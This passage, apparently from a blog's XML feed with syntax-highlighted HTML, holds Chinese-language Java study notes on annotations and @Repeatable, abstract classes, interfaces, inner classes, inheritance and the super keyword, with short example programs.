class="comment">//注解的参数：参数类型+参数名();</span></span><br><span class="line">   String <span class="title function_">name</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;<span class="comment">//default表示默认值参数</span></span><br><span class="line">   <span class="type">int</span> <span class="title function_">id</span><span class="params">()</span> <span class="keyword">default</span> -<span class="number">1</span>;<span class="comment">//如果默认值是-1，则表示不存在</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Target(value = &#123;ElementType.TYPE, ElementType.METHOD&#125;)</span><span class="comment">//指定注解的作用目标</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span><span class="comment">//指定注解的生命周期</span></span><br><span class="line"><span class="meta">@interface</span> MyAnnotation2 &#123;</span><br><span class="line">   String <span class="title function_">value</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="可重复注解">可重复注解</h3><p>jdk8之前，当我们需要写两个相同的注解A但不同值得时，我们需要造多一个注解B，内部值设置为注解A数组，然后使用注解B包含两个注解A完成这个操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">   <span class="meta">@BigTest(&#123;@Test(&quot;1&quot;), @Test(&quot;2&quot;)&#125;)</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@interface</span> Test&#123;</span><br><span class="line">   String <span class="title function_">value</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@interface</span> BigTest&#123;</span><br><span class="line">   Test[] value();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在jdk8之后引入了一个新的元注解，使得我们可以重复注解——@Repeatable()：</p><ol><li>在注解A中声明@Repeatable()，成员值为注解B</li><li>注解A与注解B的Target、Retention需要相同</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">   <span class="meta">@Test(&quot;1&quot;)</span></span><br><span class="line">   <span class="meta">@Test(&quot;2&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Repeatable(BigTest.class)</span></span><br><span class="line"><span class="meta">@interface</span> Test&#123;</span><br><span class="line">   String <span class="title function_">value</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@interface</span> BigTest&#123;</span><br><span class="line">   Test[] value();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java笔记（5）：抽象类、接口、内部类</title>
      <link href="/2022/03/23/Java%E7%AC%94%E8%AE%B0%EF%BC%885%EF%BC%89%EF%BC%9A%E6%8A%BD%E8%B1%A1%E7%B1%BB%E3%80%81%E6%8E%A5%E5%8F%A3%E3%80%81%E5%86%85%E9%83%A8%E7%B1%BB/"/>
      <url>/2022/03/23/Java%E7%AC%94%E8%AE%B0%EF%BC%885%EF%BC%89%EF%BC%9A%E6%8A%BD%E8%B1%A1%E7%B1%BB%E3%80%81%E6%8E%A5%E5%8F%A3%E3%80%81%E5%86%85%E9%83%A8%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="面向对象-三">面向对象（三）</h2><h3 id="抽象类">抽象类</h3><p>抽象类用<code>abstract</code>进行修饰。</p><p>在前面的学习我们知道，所有的对象都是通过类来描绘的，但是不是所有的类都是用来描述对象的，如果一个类中没有足够的成员来描绘一个具体的对象，那这个类就是抽象类。</p><p>简而言之，抽象类里面可以什么东西都不用去实现，只留有一个大概的框架，作为对后面继承的子类的约束。</p><p>抽象类里面可以有正常的方法，也可以有用<code>abstract</code>修饰的抽象方法，抽象方法也同样是可以不去实现的。</p><p>实际上受限于Java只能单继承，抽象类使用并不如接口常见。</p><p>总结一下，抽象类的特点：</p><ol><li>抽象类无法实例化，也就是无法new出来，它需要靠子类去实现它；</li><li>子类继承抽象类需要实现抽象类内的内容，除非子类也是个抽象类；</li><li>抽象类里可以写普通方法，但是抽象方法必须在抽象类中；静态方法，也就是被<code>static</code>修饰的方法，不能被声明为抽象方法；</li><li>抽象类含有构造器，是为了被子类继承，子类必须调用父类构造器。</li></ol><h4 id="例子">例子</h4><p>Demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">      student.run();<span class="comment">//out：I am running.</span></span><br><span class="line">      student.say();<span class="comment">//out：I am studying.</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Person（抽象类）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;I am running.&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Student（子类）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;I am studying.&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="接口">接口</h3><p>接口与抽象类比较相似，但它并不是一个类，因此他并不是用<code>class</code>来声明，而是使用<code>interface</code>。抽象类和接口的区别在于，抽象类可以有具体实现和抽象方法，而接口只存在抽象方法。</p><p>接口是对类的实现进行一种约束，也就是一种<code>你是什么就应该做什么</code>的规范，也就是例如，人你就得会吃饭，汽车你就得会跑，但是你怎么吃饭，汽车怎么跑，这是类应该去描绘的内容。接口实现了约束和实现的分离。</p><h4 id="接口的特性">接口的特性</h4><ol><li>接口中的方法都是<code>public abstract</code>的，而且只能是<code>public abstract</code>的；</li><li>接口中可以含有变量，但是变量都是<code>public static final</code>的，而且只能是<code>public</code>的；</li><li>接口中的方法是不能在接口中实现的，只能由实现接口的来实现接口的方法。</li></ol><p>类用<code>implements</code>关键词来实现接口。跟抽象类一样，实现了接口的类，就需要重写接口中的方法。与只能继承一个抽象类不同，类可以实现多个接口。</p><p>接口和接口直接也是可以互相继承的，同样也是使用<code>extend</code>来继承。虽然他有继承关系，但是接口里是不存在构造器的。</p><h4 id="例子">例子</h4><p>PersonImple：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PersonImpl</span> <span class="keyword">implements</span> <span class="title class_">Person</span>,Clothes&#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">color</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Animal：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Person：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Person</span> <span class="keyword">extends</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Clothes：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Clothes</span> &#123;</span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">color</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="内部类">内部类</h3><p>内部类是在一个类的内部再定义一个类。</p><h4 id="成员内部类">成员内部类</h4><p>由于该内部类嵌套在外部类内，我们需要先实例化外部类，然后再通过外部类实例化的对象来实例化内部类。</p><p>内部类是可以访问到外部类的私有成员的。</p><p>Demo:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">Outer</span> <span class="variable">outer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Outer</span>();</span><br><span class="line">Outer.<span class="type">Inner</span> <span class="variable">inner</span> <span class="operator">=</span> outer.<span class="keyword">new</span> <span class="title class_">Inner</span>();</span><br><span class="line">inner.get();<span class="comment">//out:外部类</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Outer:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Outer</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;外部类&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inner</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">get</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(str);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>内部类可以使用<code>private</code>或<code>protected</code>来修饰，如果你不希望内部类被外部类访问可以使用<code>private </code>修饰符。</p><h4 id="静态内部类">静态内部类</h4><p>静态内部类可以使用 static 关键字定义，静态内部类就不需要先实例化外部类再实例化内部类了，可以直接实例化内部类。</p><p>如果外部类是非静态的，而内部类是静态的，那么内部类就无法在外部类实例化之前调用外部类的成员了。</p><p>Demo:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      Outer.<span class="type">Inner</span> <span class="variable">inner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Outer</span>.Inner();</span><br><span class="line">      System.out.println(inner.str2);<span class="comment">//out:内部类</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Outer:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Outer</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;外部类&quot;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Inner</span>&#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="string">&quot;内部类&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="局部内部类">局部内部类</h4><p>局部内部类与局部变量一样，不能使用访问控制修饰符和<code>static</code>修饰符，局部内部类仅在当前方法中有效。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Outer</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="keyword">class</span> <span class="title class_">Inner</span>&#123;&#125;<span class="comment">//内部类</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="匿名内部类">匿名内部类</h4><p>这种类我们之前有所使用，我们来举一个例子，应该会很清楚。总所周知接口是不能实例化的，而这个例子却可以。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">test</span>()&#123;<span class="comment">//实际上这里的效果跟test test = new test()相同</span></span><br><span class="line">         <span class="meta">@Override</span></span><br><span class="line">         <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;hello world!&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">test</span>&#123;</span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java笔记（4）：继承、多态</title>
      <link href="/2022/03/17/Java%E7%AC%94%E8%AE%B0%EF%BC%884%EF%BC%89%EF%BC%9A%E7%BB%A7%E6%89%BF%E3%80%81%E5%A4%9A%E6%80%81/"/>
      <url>/2022/03/17/Java%E7%AC%94%E8%AE%B0%EF%BC%884%EF%BC%89%EF%BC%9A%E7%BB%A7%E6%89%BF%E3%80%81%E5%A4%9A%E6%80%81/</url>
      
        <content type="html"><![CDATA[<h2 id="面向对象-二">面向对象（二）</h2><h3 id="继承">继承</h3><p>在前面的学习我们可以知道，类是对某一批对象的抽象，而继承的本质是对某一批类的抽象，类比于现实世界中对动植物进行界门纲目科属种的逐级分类。</p><p>子类（派生类）是父类（基类）的拓展，子类继承父类，我们用<code>extends</code>这个关键词表示继承的关系。（<code>extends v.拓展</code>）子类与父类之间具有一个<code>is</code>的关系，比如学生（子类）是人（父类）。</p><p>子类可以继承父类所有<code>public</code>的属性与方法，而父类<code>private</code>的属性与方法，子类是无法继承的。当我们需要让子类继承父类的属性与方法，且又不被继承关系以外的访问到的时候，我们就需要用到<code>protected</code>关键词，让子类能够继承父类使用<code>protected</code>的属性与方法。</p><p>在Java里，所有的类，都默认直接或者间接继承了<code>Object</code>类。</p><p>注意，在Java里，只有单继承，无多继承，一个子类只能有一个父类。</p><p>tips:在IDEA里，<code>ctrl+h</code>快捷键可以打开继承树，可以很直观看到继承关系。</p><p>例：</p><p>main:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">Student</span> <span class="variable">student1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">       </span><br><span class="line">      student1.setName(<span class="string">&quot;XiaoMing&quot;</span>);</span><br><span class="line">      student1.setAge(<span class="number">17</span>);</span><br><span class="line">      student1.setID(<span class="number">810</span>);</span><br><span class="line">      student1.setGrade(<span class="number">99</span>);<span class="comment">//无参构造</span></span><br><span class="line">       </span><br><span class="line">      <span class="type">Student</span> <span class="variable">student2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;XiaoHong&quot;</span>, <span class="number">16</span>, <span class="number">114</span>, <span class="number">100</span>);<span class="comment">//有参构造</span></span><br><span class="line">      </span><br><span class="line">      System.out.println(student1.getName()+<span class="string">&quot; &quot;</span>+student1.getAge()+<span class="string">&quot; &quot;</span>+student1.getID()+<span class="string">&quot; &quot;</span>+student1.getGrade());<span class="comment">//out:XiaoMing 17 810 99</span></span><br><span class="line">      System.out.println(student2.getName()+<span class="string">&quot; &quot;</span>+student2.getAge()+<span class="string">&quot; &quot;</span>+student2.getID()+<span class="string">&quot; &quot;</span>+student2.getGrade());<span class="comment">//out:XiaoHong 16 114 100</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Person:（父类）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">   <span class="keyword">protected</span> String name;</span><br><span class="line">   <span class="keyword">protected</span> <span class="type">int</span> age;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.name = name;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.age = age;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> name;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> age;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Student:（子类）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> grade;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> ID;</span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String aName, <span class="type">int</span> aAge, <span class="type">int</span> aID, <span class="type">int</span> aGrade)</span>&#123;</span><br><span class="line">      name = aName;</span><br><span class="line">      age = aAge;<span class="comment">//子类继承了父类的属性</span></span><br><span class="line">      ID = aID;</span><br><span class="line">      grade = aGrade;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getGrade</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> grade;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setGrade</span><span class="params">(<span class="type">int</span> grade)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.grade = grade;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getID</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> ID;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setID</span><span class="params">(<span class="type">int</span> ID)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.ID = ID;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="super">super</h4><p><code>super</code>关键词可以调用父类的属性与方法，用来引用当前对象的父类。</p><p>直接进入例子：</p><p>main:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">      <span class="comment">/*out：</span></span><br><span class="line"><span class="comment">      父类无参构造被执行</span></span><br><span class="line"><span class="comment">      子类无参构造被执行</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      student.output();</span><br><span class="line">      <span class="comment">/*out：</span></span><br><span class="line"><span class="comment">      Student</span></span><br><span class="line"><span class="comment">      Student</span></span><br><span class="line"><span class="comment">      Person</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Person（父类）:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;父类无参构造被执行&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Person&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Student（子类）:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="comment">//由于子类是不继承父类的构造器，所以这里隐藏着调用父类构造器:super();</span></span><br><span class="line">      <span class="comment">//注意：调用父类构造器时，必须写在子类构造器的第一行</span></span><br><span class="line">      System.out.println(<span class="string">&quot;子类无参构造被执行&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Student&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">output</span><span class="params">()</span>&#123;</span><br><span class="line">      print();</span><br><span class="line">      <span class="built_in">this</span>.print();</span><br><span class="line">      <span class="built_in">super</span>.print();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意点</strong>：</p><ol><li><code>super</code>只能出现在子类的方法或者构造器中</li><li>当父类没有无参构造时，子类就无法调用父类无参构造，也就是说必须要在子类构造器内写上父类的有参构造。</li></ol><p>例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Person：</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name)</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Student：</span></span><br><span class="line"><span class="keyword">public</span> <span 